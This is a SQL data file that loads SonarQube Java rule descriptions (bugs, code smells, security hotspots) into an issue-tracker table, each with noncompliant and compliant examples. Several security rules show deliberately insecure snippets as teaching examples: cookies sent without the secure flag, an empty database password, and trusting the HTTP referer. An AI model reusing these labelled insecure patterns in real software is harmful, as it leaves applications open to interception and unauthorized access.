  (JPA)</a>, <a href="https://h3xstream.github.io/find-sec-bugs/bugs.htm#SQL_INJECTION_JDO">Potential SQL/JDOQL Injection (JDO)</a>, <a
  href="https://h3xstream.github.io/find-sec-bugs/bugs.htm#SQL_INJECTION_HIBERNATE">Potential SQL/HQL Injection (Hibernate)</a> </li>
</ul>', 'java', 'READY', 'MAJOR', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S2089', 'HTTP referers should not be relied on', 'sonarqube', 'Vulnerability', '<p>The fields in an HTTP request are putty in the hands of an attacker, and you cannot rely on them to tell you the truth about anything. While it may
be safe to store such values after they have been neutralized, decisions should never be made based on their contents.</p>
<p>This rule flags uses of the referer header field.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public class MyServlet extends HttpServlet {
  protected void doPost(HttpServletRequest request, HttpServletResponse response)
        throws ServletException, IOException {
    String referer = request.getHeader("referer");  // Noncompliant
    if(isTrustedReferer(referer)){
      //..
    }
    //...
  }
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://www.owasp.org/index.php/Top_10-2017_A2-Broken_Authentication">OWASP Top 10 2017 Category A2</a> - Broken Authentication </li>
  <li> <a href="http://cwe.mitre.org/data/definitions/807">MITRE, CWE-807</a> - Reliance on Untrusted Inputs in a Security Decision </li>
  <li> <a href="http://cwe.mitre.org/data/definitions/293">MITRE, CWE-293</a> - Using Referer Field for Authentication </li>
  <li> <a href="https://www.sans.org/top25-software-errors/#cat3">SANS Top 25</a> - Porous Defenses </li>
</ul>
<h2>Deprecated</h2>
<p>This rule is deprecated, and will eventually be removed.</p>', 'java', 'DEPRECATED', 'CRITICAL', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S2092', 'Creating cookies without the "secure" flag is security-sensitive', 'sonarqube', 'Security Hotspot', '<p>When a cookie is protected with the <code>secure</code> attribute set to <em>true</em> it will not be send by the browser over an unencrypted HTTP
request and thus cannot be observed by an unauthorized person during a man-in-the-middle attack. </p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> the cookie is for instance a <em>session-cookie</em> not designed to be sent over non-HTTPS communication. </li>
  <li> it''s not sure that the website contains <a href="https://developer.mozilla.org/fr/docs/Web/Security/Mixed_content">mixed content</a> or not (ie
  HTTPS everywhere or not) </li>
</ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul>
  <li> It is recommended to use <code>HTTPs</code> everywhere so setting the <code>secure</code> flag to <em>true</em> should be the default behaviour
  when creating cookies. </li>
  <li> Set the <code>secure</code> flag to <em>true</em> for session-cookies. </li>
</ul>
<h2>Sensitive Code Example</h2>
<p>If you create a security-sensitive cookie in your JAVA code:</p>
<pre>
Cookie c = new Cookie(COOKIENAME, sensitivedata);
c.setSecure(false);  // Sensitive: a security-ensitive cookie is created with the secure flag set to false
</pre>
<p>By default the <a href="https://docs.oracle.com/javaee/6/api/javax/servlet/http/Cookie.html#setSecure(boolean)"><code>secure</code></a> flag is set
to <em>false:</em></p>
<pre>
Cookie c = new Cookie(COOKIENAME, sensitivedata);  // Sensitive: a security-sensitive cookie is created with the secure flag not defined (by default set to false)
</pre>
<h2>Compliant Solution</h2>
<pre>
Cookie c = new Cookie(COOKIENAME, sensitivedata);
c.setSecure(true); // Compliant: the sensitive cookie will not be send during an unencrypted HTTP request thanks to the secure flag set to true
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://www.owasp.org/index.php/Top_10-2017_A3-Sensitive_Data_Exposure">OWASP Top 10 2017 Category A3</a> - Sensitive Data Exposure
  </li>
  <li> <a href="http://cwe.mitre.org/data/definitions/311">MITRE, CWE-311</a> - Missing Encryption of Sensitive Data </li>
  <li> <a href="http://cwe.mitre.org/data/definitions/315">MITRE, CWE-315</a> - Cleartext Storage of Sensitive Information in a Cookie </li>
  <li> <a href="http://cwe.mitre.org/data/definitions/614">MITRE, CWE-614</a> - Sensitive Cookie in HTTPS Session Without ''Secure'' Attribute </li>
  <li> <a href="https://www.sans.org/top25-software-errors/#cat3">SANS Top 25</a> - Porous Defenses </li>
</ul>', 'java', 'READY', 'MINOR', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S2093', 'Try-with-resources should be used', 'sonarqube', 'Code Smell', '<p>Java 7 introduced the try-with-resources statement, which guarantees that the resource in question will be closed. Since the new syntax is closer
to bullet-proof, it should be preferred over the older <code>try</code>/<code>catch</code>/<code>finally</code> version.</p>
<p>This rule checks that <code>close</code>-able resources are opened in a try-with-resources statement.</p>
<p><strong>Note</strong> that this rule is automatically disabled when the project''s <code>sonar.java.source</code> is lower than <code>7</code>.</p>
<h2>Noncompliant Code Example</h2>
<pre>
FileReader fr = null;
BufferedReader br = null;
try {
  fr = new FileReader(fileName);
  br = new BufferedReader(fr);
  return br.readLine();
} catch (...) {
} finally {
  if (br != null) {
    try {
      br.close();
    } catch(IOException e){...}
  }
  if (fr != null ) {
    try {
      br.close();
    } catch(IOException e){...}
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
try (
    FileReader fr = new FileReader(fileName);
    BufferedReader br = new BufferedReader(fr)
  ) {
  return br.readLine();
}
catch (...) {}
</pre>
<p>or</p>
<pre>
try (BufferedReader br =
        new BufferedReader(new FileReader(fileName))) { // no need to name intermediate resources if you don''t want to
  return br.readLine();
}
catch (...) {}
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://wiki.sei.cmu.edu/confluence/x/6DZGBQ">CERT, ERR54-J.</a> - Use a try-with-resources statement to safely handle closeable
  resources </li>
</ul>', 'java', 'READY', 'CRITICAL', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S2094', 'Classes should not be empty', 'sonarqube', 'Code Smell', '<p>There is no good excuse for an empty class. If it''s being used simply as a common extension point, it should be replaced with an
<code>interface</code>. If it was stubbed in as a placeholder for future development it should be fleshed-out. In any other case, it should be
eliminated.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public class Nothing {  // Noncompliant
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public interface Nothing {
}
</pre>
<h2>Exceptions</h2>
<p>Empty classes can be used as marker types (for Spring for instance), therefore empty classes that are annotated will be ignored.</p>
<pre>
@Configuration
@EnableWebMvc
public final class ApplicationConfiguration {

}
</pre>', 'java', 'READY', 'MINOR', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S2095', 'Resources should be closed', 'sonarqube', 'Bug', '<p>Connections, streams, files, and other classes that implement the <code>Closeable</code> interface or its super-interface,
<code>AutoCloseable</code>, needs to be closed after use. Further, that <code>close</code> call must be made in a <code>finally</code> block otherwise
an exception could keep the call from being made. Preferably, when class implements <code>AutoCloseable</code>, resource should be created using
"try-with-resources" pattern and will be closed automatically.</p>
<p>Failure to properly close resources will result in a resource leak which could bring first the application and then perhaps the box the application
is on to their knees.</p>
<h2>Noncompliant Code Example</h2>
<pre>
private void readTheFile() throws IOException {
  Path path = Paths.get(this.fileName);
  BufferedReader reader = Files.newBufferedReader(path, this.charset);
  // ...
  reader.close();  // Noncompliant
  // ...
  Files.lines("input.txt").forEach(System.out::println); // Noncompliant: The stream needs to be closed
}

private void doSomething() {
  OutputStream stream = null;
  try {
    for (String property : propertyList) {
      stream = new FileOutputStream("myfile.txt");  // Noncompliant
      // ...
    }
  } catch (Exception e) {
    // ...
  } finally {
    stream.close();  // Multiple streams were opened. Only the last is closed.
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
private void readTheFile(String fileName) throws IOException {
    Path path = Paths.get(fileName);
    try (BufferedReader reader = Files.newBufferedReader(path, StandardCharsets.UTF_8)) {
      reader.readLine();
      // ...
    }
    // ..
    try (Stream&lt;String&gt; input = Files.lines("input.txt"))  {
      input.forEach(System.out::println);
    }
}

private void doSomething() {
  OutputStream stream = null;
  try {
    stream = new FileOutputStream("myfile.txt");
    for (String property : propertyList) {
      // ...
    }
  } catch (Exception e) {
    // ...
  } finally {
    stream.close();
  }
}
</pre>
<h2>Exceptions</h2>
<p>Instances of the following classes are ignored by this rule because <code>close</code> has no effect:</p>
<ul>
  <li> <code>java.io.ByteArrayOutputStream</code> </li>
  <li> <code>java.io.ByteArrayInputStream</code> </li>
  <li> <code>java.io.CharArrayReader</code> </li>
  <li> <code>java.io.CharArrayWriter</code> </li>
  <li> <code>java.io.StringReader</code> </li>
  <li> <code>java.io.StringWriter</code> </li>
</ul>
<p>Java 7 introduced the try-with-resources statement, which implicitly closes <code>Closeables</code>. All resources opened in a try-with-resources
statement are ignored by this rule. </p>
<pre>
try (BufferedReader br = new BufferedReader(new FileReader(fileName))) {
  //...
}
catch ( ... ) {
  //...
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href="http://cwe.mitre.org/data/definitions/459.html">MITRE, CWE-459</a> - Incomplete Cleanup </li>
  <li> <a href="http://cwe.mitre.org/data/definitions/772.html">MITRE, CWE-772</a> - Missing Release of Resource after Effective Lifetime </li>
  <li> <a href="https://wiki.sei.cmu.edu/confluence/x/vjdGBQ">CERT, FIO04-J.</a> - Release resources when they are no longer needed </li>
  <li> <a href="https://wiki.sei.cmu.edu/confluence/x/QtUxBQ">CERT, FIO42-C.</a> - Close files when they are no longer needed </li>
  <li> <a href="https://docs.oracle.com/javase/tutorial/essential/exceptions/tryResourceClose.html">Try With Resources</a> </li>
</ul>', 'java', 'READY', 'BLOCKER', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S2096', '"main" should not "throw" anything', 'sonarqube', 'Code Smell', '<p>There''s no reason for a <code>main</code> method to <code>throw</code> anything. After all, what''s going to catch it? </p>
<p>Instead, the method should itself gracefully handle any exceptions that may bubble up to it, attach as much contextual information as possible, and
perform whatever logging or user communication is necessary, and <code>exit</code> with a non-zero (i.e. non-success) exit code if necessary.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public static void main(String args[]) throws Exception { // Noncompliant
  doSomething();
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public static void main(String args[]) {
 try {
    doSomething();
  } catch (Throwable t) {
    log.error(t);
    System.exit(1);  // Default exit code, 0, indicates success. Non-zero value means failure.
  }
}
</pre>', 'java', 'READY', 'BLOCKER', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S2097', '"equals(Object obj)" should test argument type', 'sonarqube', 'Bug', '<p>Because the <code>equals</code> method takes a generic <code>Object</code> as a parameter, any type of object may be passed to it. The method
should not assume it will only be used to test objects of its class type. It must instead check the parameter''s type.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public boolean equals(Object obj) {
  MyClass mc = (MyClass)obj;  // Noncompliant
  // ...
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public boolean equals(Object obj) {
  if (obj == null)
    return false;

  if (this.getClass() != obj.getClass())
    return false;

  MyClass mc = (MyClass)obj;
  // ...
}
</pre>', 'java', 'READY', 'MINOR', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S2109', 'Reflection should not be used to check non-runtime annotations', 'sonarqube', 'Bug', '<p>The writer of an annotation can set one of three retention policies for it:</p>
<ul>
  <li> <code>RetentionPolicy.SOURCE</code> - these annotations are dropped during compilation, E.G. <code>@Override</code>,
  <code>@SuppressWarnings</code>. </li>
  <li> <code>RetentionPolicy.CLASS</code> - these annotations are present in a compiled class but not loaded into the JVM at runtime. This is the
  default. </li>
  <li> <code>RetentionPolicy.RUNTIME</code> - these annotations are present in the class file and loaded into the JVM. </li>
</ul>
<p>Only annotations that have been given a <code>RUNTIME</code> retention policy will be available to reflection. Testing for annotations with any
other retention policy is simply an error, since the test will always return false.</p>
<p>This rule checks that reflection is not used to detect annotations that do not have <code>RUNTIME</code> retention.</p>
<h2>Noncompliant Code Example</h2>
<pre>
Method m = String.class.getMethod("getBytes", new Class[] {int.class,
int.class, byte[].class, int.class});
if (m.isAnnotationPresent(Override.class)) {  // Noncompliant; test will always return false, even when @Override is present in the code
</pre>', 'java', 'READY', 'MAJOR', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S2110', 'Invalid "Date" values should not be used', 'sonarqube', 'Bug', '<p>Whether the valid value ranges for <code>Date</code> fields start with 0 or 1 varies by field. For instance, month starts at 0, and day of month
starts at 1. Enter a date value that goes past the end of the valid range, and the date will roll without error or exception. For instance, enter 12
for month, and you''ll get January of the following year.</p>
<p>This rule checks for bad values used in conjunction with <code>java.util.Date</code>, <code>java.sql.Date</code>, and
<code>java.util.Calendar</code>. Specifically, values outside of the valid ranges:</p>
<table>
  <tbody>
    <tr>
      <th>Field</th>
      <th>Valid</th>
    </tr>
    <tr>
      <td>month</td>
      <td>0-11</td>
    </tr>
    <tr>
      <td>date (day)</td>
      <td>0-31</td>
    </tr>
    <tr>
      <td>hour</td>
      <td>0-23</td>
    </tr>
    <tr>
      <td>minute</td>
      <td>0-60</td>
    </tr>
    <tr>
      <td>second</td>
      <td>0-61</td>
    </tr>
  </tbody>
</table>
<p>Note that this rule does not check for invalid leap years, leap seconds (second = 61), or invalid uses of the 31st day of the month.</p>
<h2>Noncompliant Code Example</h2>
<pre>
Date d = new Date();
d.setDate(25);
d.setYear(2014);
d.setMonth(12);  // Noncompliant; rolls d into the next year

Calendar c = new GregorianCalendar(2014, 12, 25);  // Noncompliant
if (c.get(Calendar.MONTH) == 12) {  // Noncompliant; invalid comparison
  // ...
}
</pre>
<h2>Compliant Solution</h2>
<pre>
Date d = new Date();
d.setDate(25);
d.setYear(2014);
d.setMonth(11);

Calendar c = new Gregorian Calendar(2014, 11, 25);
if (c.get(Calendar.MONTH) == 11) {
  // ...
}
</pre>', 'java', 'READY', 'MAJOR', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S2111', '"BigDecimal(double)" should not be used', 'sonarqube', 'Bug', '<p>Because of floating point imprecision, you''re unlikely to get the value you expect from the <code>BigDecimal(double)</code> constructor. </p>
<p>From <a href="http://docs.oracle.com/javase/7/docs/api/java/math/BigDecimal.html#BigDecimal(double)">the JavaDocs</a>:</p>
<blockquote>
  The results of this constructor can be somewhat unpredictable. One might assume that writing new BigDecimal(0.1) in Java creates a BigDecimal which
  is exactly equal to 0.1 (an unscaled value of 1, with a scale of 1), but it is actually equal to
  0.1000000000000000055511151231257827021181583404541015625. This is because 0.1 cannot be represented exactly as a double (or, for that matter, as a
  binary fraction of any finite length). Thus, the value that is being passed in to the constructor is not exactly equal to 0.1, appearances
  notwithstanding.
</blockquote>
<p>Instead, you should use <code>BigDecimal.valueOf</code>, which uses a string under the covers to eliminate floating point rounding errors, or the
constructor that takes a <code>String</code> argument.</p>
<h2>Noncompliant Code Example</h2>
<pre>
double d = 1.1;

BigDecimal bd1 = new BigDecimal(d); // Noncompliant; see comment above
BigDecimal bd2 = new BigDecimal(1.1); // Noncompliant; same result
</pre>
<h2>Compliant Solution</h2>
<pre>
double d = 1.1;

BigDecimal bd1 = BigDecimal.valueOf(d);
BigDecimal bd2 = new BigDecimal("1.1"); // using String constructor will result in precise value
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://wiki.sei.cmu.edu/confluence/x/kzdGBQ">CERT, NUM10-J.</a> - Do not construct BigDecimal objects from floating-point literals
  </li>
</ul>', 'java', 'READY', 'MAJOR', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S2112', '"URL.hashCode" and "URL.equals" should be avoided', 'sonarqube', 'Code Smell', '<p>The <code>equals</code> and <code>hashCode</code> methods of <code>java.net.URL</code> both may trigger a name service (usually DNS) lookup to
resolve the host name or IP address. Depending on the configuration, and network status, that can take a long time. <code>URI</code> on the other hand
makes no such calls and should be used instead unless the specific <code>URL</code> functionality is required.</p>
<p>In general it is better to use the <code>URI</code> class until access to the resource is actually needed, at which point you can just convert the
<code>URI</code> to a <code>URL</code> using <code>URI.toURL()</code>.</p>
<p>This rule checks for uses of <code>URL</code> ''s in <code>Map</code> and <code>Set</code> , and for explicit calls to the <code>equals</code> and
<code>hashCode</code> methods.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public void checkUrl(URL url) {
  Set&lt;URL&gt; sites = new HashSet&lt;URL&gt;();  // Noncompliant

  URL homepage = new URL("http://sonarsource.com");  // Compliant
  if (homepage.equals(url)) { // Noncompliant
    // ...
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public void checkUrl(URL url) {
  Set&lt;URI&gt; sites = new HashSet&lt;URI&gt;();  // Compliant

  URI homepage = new URI("http://sonarsource.com");  // Compliant
  URI uri = url.toURI();
  if (homepage.equals(uri)) {  // Compliant
    // ...
  }
}
</pre>', 'java', 'READY', 'MAJOR', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S2114', 'Collections should not be passed as arguments to their own methods', 'sonarqube', 'Bug', '<p>Passing a collection as an argument to the collection''s own method is either an error - some other argument was intended - or simply nonsensical
code. </p>
<p>Further, because some methods require that the argument remain unmodified during the execution, passing a collection to itself can result in
undefined behavior. </p>
<h2>Noncompliant Code Example</h2>
<pre>
List &lt;Object&gt; objs = new ArrayList&lt;Object&gt;();
objs.add("Hello");

objs.add(objs); // Noncompliant; StackOverflowException if objs.hashCode() called
objs.addAll(objs); // Noncompliant; behavior undefined
objs.containsAll(objs); // Noncompliant; always true
objs.removeAll(objs); // Noncompliant; confusing. Use clear() instead
objs.retainAll(objs); // Noncompliant; NOOP
</pre>', 'java', 'READY', 'MAJOR', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S2115', 'A secure password should be used when connecting to a database', 'sonarqube', 'Vulnerability', '<p>When relying on the password authentication mode for the database connection, a secure password should be chosen.</p>
<p>This rule raises an issue when an empty password is used.</p>
<h2>Noncompliant Code Example</h2>
<pre>
Connection conn = DriverManager.getConnection("jdbc:derby:memory:myDB;create=true", "login", "");
</pre>
<h2>Compliant Solution</h2>
<pre>
String password = System.getProperty("database.password");
Connection conn = DriverManager.getConnection("jdbc:derby:memory:myDB;create=true", "login", password);
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://owasp.org/www-project-top-ten/2017/A2_2017-Broken_Authentication.html">OWASP Top 10 2017 Category A2</a> - Broken
  Authentication </li>
  <li> <a href="https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure">OWASP Top 10 2017 Category A3</a> - Sensitive Data
  Exposure </li>
  <li> <a href="https://cwe.mitre.org/data/definitions/521.html">MITRE, CWE-521</a> - Weak Password Requirements </li>
</ul>', 'java', 'READY', 'BLOCKER', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S2116', '"hashCode" and "toString" should not be called on array instances', 'sonarqube', 'Bug', '<p>While <code>hashCode</code> and <code>toString</code> are available on arrays, they are largely useless. <code>hashCode</code> returns the array''s
"identity hash code", and <code>toString</code> returns nearly the same value. Neither method''s output actually reflects the array''s contents.
Instead, you should pass the array to the relevant static <code>Arrays</code> method.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public static void main( String[] args )
{
    String argStr = args.toString(); // Noncompliant
    int argHash = args.hashCode(); // Noncompliant
</pre>
<h2>Compliant Solution</h2>
<pre>
public static void main( String[] args )
{
    String argStr = Arrays.toString(args);
    int argHash = Arrays.hashCode(args);
</pre>', 'java', 'READY', 'MAJOR', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S2118', 'Non-serializable classes should not be written', 'sonarqube', 'Bug', '<p>Nothing in a non-serializable class will be written out to file, and attempting to serialize such a class will result in an exception being thrown.
Only a class that <code>implements Serializable</code> or one that extends such a class can successfully be serialized (or de-serialized). </p>
<h2>Noncompliant Code Example</h2>
<pre>
public class Vegetable {  // neither implements Serializable nor extends a class that does
  //...
}

public class Menu {
  public void meal() throws IOException {
    Vegetable veg;
    //...
    FileOutputStream fout = new FileOutputStream(veg.getName());
    ObjectOutputStream oos = new ObjectOutputStream(fout);
    oos.writeObject(veg);  // Noncompliant. Nothing will be written
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public class Vegetable implements Serializable {  // can now be serialized
  //...
}

public class Menu {
  public void meal() throws IOException {
    Vegetable veg;
    //...
    FileOutputStream fout = new FileOutputStream(veg.getName());
    ObjectOutputStream oos = new ObjectOutputStream(fout);
    oos.writeObject(veg);
  }
}
</pre>', 'java', 'READY', 'MAJOR', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S2119', '"Random" objects should be reused', 'sonarqube', 'Bug', '<p>Creating a new <code>Random</code> object each time a random value is needed is inefficient and may produce numbers which are not random depending
on the JDK. For better efficiency and randomness, create a single <code>Random</code>, then store, and reuse it.</p>
<p>The <code>Random()</code> constructor tries to set the seed with a distinct value every time. However there is no guarantee that the seed will be
random or even uniformly distributed. Some JDK will use the current time as seed, which makes the generated numbers not random at all.</p>
<p>This rule finds cases where a new <code>Random</code> is created each time a method is invoked and assigned to a local random variable.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public void doSomethingCommon() {
  Random rand = new Random();  // Noncompliant; new instance created with each invocation
  int rValue = rand.nextInt();
  //...
</pre>
<h2>Compliant Solution</h2>
<pre>
private Random rand = SecureRandom.getInstanceStrong();  // SecureRandom is preferred to Random

public void doSomethingCommon() {
  int rValue = this.rand.nextInt();
  //...
</pre>
<h2>Exceptions</h2>
<p>A class which uses a <code>Random</code> in its constructor or in a static <code>main</code> function and nowhere else will be ignored by this
rule.</p>
<h2>See</h2>
<ul>
  <li> <a href="https://www.owasp.org/index.php/Top_10-2017_A6-Security_Misconfiguration">OWASP Top 10 2017 Category A6</a> - Security
  Misconfiguration </li>
</ul>', 'java', 'READY', 'CRITICAL', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S2121', 'Silly String operations should not be made', 'sonarqube', 'Bug', '<p>Creating a substring from 0 to the end is silly. You''ll end up with the same string you started with. Using the value of <code>String.length</code>
as either the start or end of a substring has similarly predictable results.</p>
<p>Calling <code>String.contains</code> with the argument being identical to the String on which contains is invoked doesn''t make sense.</p>
<h2>Noncompliant Code Example</h2>
<pre>
String speech = "Now is the time for all good people to come to the aid of their country.";

String s1 = speech.substring(0); // Noncompliant. Yields the whole string
String s2 = speech.substring(speech.length()); // Noncompliant. Yields "";
String s3 = speech.substring(5,speech.length()); // Noncompliant. Use the 1-arg version instead

if (speech.contains(speech)) { // Noncompliant
 // always true
}
</pre>
<h2>Compliant Solution</h2>
<pre>
String speech = "Now is the time for all good people to come to the aid of their country.";

String s1 = speech;
String s2 = "";
String s3 = speech.substring(5);
</pre>', 'java', 'READY', 'MAJOR', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S2122', '"ScheduledThreadPoolExecutor" should not have 0 core threads', 'sonarqube', 'Bug', '<p><code>java.util.concurrent.ScheduledThreadPoolExecutor</code>''s pool is sized with <code>corePoolSize</code>, so setting <code>corePoolSize</code>
to zero means the executor will have no threads and run nothing.</p>
<p>This rule detects instances where <code>corePoolSize</code> is set to zero, via either its setter or the object constructor.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public void do(){

  ScheduledThreadPoolExecutor stpe1 = new ScheduledThreadPoolExecutor(0); // Noncompliant

  ScheduledThreadPoolExecutor stpe2 = new ScheduledThreadPoolExecutor(POOL_SIZE);
  stpe2.setCorePoolSize(0);  // Noncompliant
</pre>', 'java', 'READY', 'CRITICAL', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S2123', 'Values should not be uselessly incremented', 'sonarqube', 'Bug', '<p>A value that is incremented or decremented and then not stored is at best wasted code and at worst a bug.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public int pickNumber() {
  int i = 0;
  int j = 0;

  i = i++; // Noncompliant; i is still zero

  return j++; // Noncompliant; 0 returned
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public int pickNumber() {
  int i = 0;
  int j = 0;

  i++;
  return ++j;
}
</pre>', 'java', 'READY', 'MAJOR', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S2127', '"Double.longBitsToDouble" should not be used for "int"', 'sonarqube', 'Bug', '<p><code>Double.longBitsToDouble</code> expects a 64-bit, <code>long</code> argument. Pass it a smaller value, such as an <code>int</code> and the
mathematical conversion into a <code>double</code> simply won''t work as anticipated because the layout of the bits will be interpreted incorrectly, as
if a child were trying to use an adult''s gloves.</p>
<h2>Noncompliant Code Example</h2>
<pre>
int i = 42;
double d = Double.longBitsToDouble(i);  // Noncompliant
</pre>', 'java', 'READY', 'MAJOR', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S2129', 'Constructors should not be used to instantiate "String", "BigInteger", "BigDecimal" and primitive-wrapper classes', 'sonarqube', 'Code Smell', '<p>Constructors for <code>String</code>, <code>BigInteger</code>, <code>BigDecimal</code> and the objects used to wrap primitives should never be
used. Doing so is less clear and uses more memory than simply using the desired value in the case of strings, and using <code>valueOf</code> for
everything else.</p>
<h2>Noncompliant Code Example</h2>
<pre>
String empty = new String(); // Noncompliant; yields essentially "", so just use that.
String nonempty = new String("Hello world"); // Noncompliant
Double myDouble = new Double(1.1); // Noncompliant; use valueOf
Integer integer = new Integer(1); // Noncompliant
Boolean bool = new Boolean(true); // Noncompliant
BigInteger bigInteger1 = new BigInteger("3"); // Noncompliant
BigInteger bigInteger2 = new BigInteger("9223372036854775807"); // Noncompliant
BigInteger bigInteger3 = new BigInteger("111222333444555666777888999"); // Compliant, greater than Long.MAX_VALUE
</pre>
<h2>Compliant Solution</h2>
<pre>
String empty = "";
String nonempty = "Hello world";
Double myDouble = Double.valueOf(1.1);
Integer integer = Integer.valueOf(1);
Boolean bool = Boolean.valueOf(true);
BigInteger bigInteger1 = BigInteger.valueOf(3);
BigInteger bigInteger2 = BigInteger.valueOf(9223372036854775807L);
BigInteger bigInteger3 = new BigInteger("111222333444555666777888999");
</pre>
<h2>Exceptions</h2>
<p><code>BigDecimal</code> constructor with <code>double</code> argument is ignored as using <code>valueOf</code> instead might change resulting
value. See <a href=''/coding_rules#rule_key=java%3AS2111''>S2111</a> .</p>', 'java', 'READY', 'MAJOR', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S2130', 'Parsing should be used to convert "Strings" to primitives', 'sonarqube', 'Code Smell', '<p>Rather than creating a boxed primitive from a <code>String</code> to extract the primitive value, use the relevant <code>parse</code> method
instead. It will be clearer and more efficient.</p>
<h2>Noncompliant Code Example</h2>
<pre>
String myNum = "12.2";

float f = (new Float(myNum)).floatValue();  // Noncompliant; creates &amp; discards a Float
</pre>
<h2>Compliant Solution</h2>
<pre>
String myNum = "12.2";

float f = Float.parseFloat(myNum);
</pre>', 'java', 'READY', 'MINOR', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S2131', 'Primitives should not be boxed just for "String" conversion', 'sonarqube', 'Code Smell', '<p>"Boxing" is the process of putting a primitive value into a primitive-wrapper object. When that''s done purely to use the wrapper class''
<code>toString</code> method, it''s a waste of memory and cycles because those methods are <code>static</code>, and can therefore be used without a
class instance. Similarly, using the <code>static</code> method <code>valueOf</code> in the primitive-wrapper classes with a non-<code>String</code>
argument should be avoided.</p>
<h2>Noncompliant Code Example</h2>
<pre>
int myInt = 4;
String myIntString = (new Integer(myInt)).toString(); // Noncompliant; creates &amp; discards an Integer object
myIntString = Integer.valueOf(myInt).toString(); // Noncompliant
</pre>
<h2>Compliant Solution</h2>
<pre>
int myInt = 4;
String myIntString = Integer.toString(myInt);
</pre>', 'java', 'READY', 'MAJOR', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S2133', 'Objects should not be created only to "getClass"', 'sonarqube', 'Code Smell', '<p>Creating an object for the sole purpose of calling <code>getClass</code> on it is a waste of memory and cycles. Instead, simply use the class''
<code>.class</code> property.</p>
<h2>Noncompliant Code Example</h2>
<pre>
MyObject myOb = new MyObject();  // Noncompliant
Class c = myOb.getClass();
</pre>
<h2>Compliant Solution</h2>
<pre>
Class c = MyObject.class;
</pre>', 'java', 'READY', 'MAJOR', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S2134', 'Classes extending java.lang.Thread should override the "run" method', 'sonarqube', 'Bug', '<p>According to the Java API documentation:</p>
<blockquote>
  <p>There are two ways to create a new thread of execution. One is to declare a class to be a subclass of Thread. This subclass should override the
  run method of class Thread. An instance of the subclass can then be allocated and started...</p>
  <p>The other way to create a thread is to declare a class that implements the Runnable interface. That class then implements the run method. An
  instance of the class can then be allocated, passed as an argument when creating Thread, and started.</p>
</blockquote>
